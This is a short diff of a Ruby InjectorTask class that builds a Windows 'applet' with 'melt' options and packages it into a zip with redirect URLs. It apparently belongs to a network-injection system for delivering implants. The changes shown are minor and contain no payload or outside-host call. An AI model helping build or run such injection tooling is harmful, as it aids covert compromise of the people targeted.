@@ -49,14 +49,14 @@ class InjectorTask
           # generate the applet
           params = {'factory' => {'_id' => rule.action_param},
                     'binary' => {'demo' => LicenseManager.instance.limits[:nia][1]},
-                    'melt' => {'admin' => true, 'cooked' => true}
+                    'melt' => {'admin' => true, 'cooked' => true, 'appname' => factory.ident}
                     }
           build = Build.factory(:windows)
           build.create params
           FileUtils.cp build.path(build.outputs.first), temp_zip
           build.clean
 
-          # extract the zip and take the applet files
+          # extract the zip
           Zip::ZipFile.open(temp_zip) do |z|
             z.each do |f|
               f_path = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
@@ -136,6 +136,7 @@ class InjectorTask
       end
 
       z.put_next_entry("redirect_url.txt")
+      z.puts "REDIRECT_PAGE = redirect.html"
       redirect_url.each do |value|
         z.puts value
       end
